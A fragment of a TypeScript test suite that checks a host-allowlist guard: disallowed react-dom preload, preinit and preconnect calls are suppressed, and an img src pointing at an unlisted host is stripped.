    expect(seen).toEqual([{ src: CDN, alt: '' }, {}, { href: CDN }, { src: CDN }, {}])
    const loaded: unknown[] = []
    const dom = guardModule('react-dom', { preinit: (h: unknown) => loaded.push(h), preload: (h: unknown) => loaded.push(h), preconnect: (h: unknown) => loaded.push(h) }, { allowedHosts: hosts })
    ;(dom.preinit as (h: string) => void)('https://cdn.example.com/x.js')
    ;(dom.preload as (h: string) => void)(CDN)
    ;(dom.preconnect as (h: string) => void)('https://cdn.example.com')
    expect(loaded).toEqual([])
    const out: unknown[] = []
    const registry = installExternals({ 'react/jsx-runtime': { jsx: (_t: unknown, p: unknown) => out.push(p), jsxs: () => null } }, 'allowed-hosts-test', { allowedHosts: hosts })
    ;(registry.require('react/jsx-runtime') as { jsx: (t: unknown, p: unknown) => void }).jsx('img', { src: CDN })
    ;(registry.require('react/jsx-runtime') as { jsx: (t: unknown, p: unknown) => void }).jsx('img', { src: 'https://evil.example/a.png' })
    expect(out).toEqual([{ src: CDN }, {}])
    expect(normalizeAllowedHosts(undefined)).toEqual([])
    expect(normalizeAllowedHosts(['CDN.example.com', 'cdn.example.com'])).toEqual(['cdn.example.com'])
  })
})
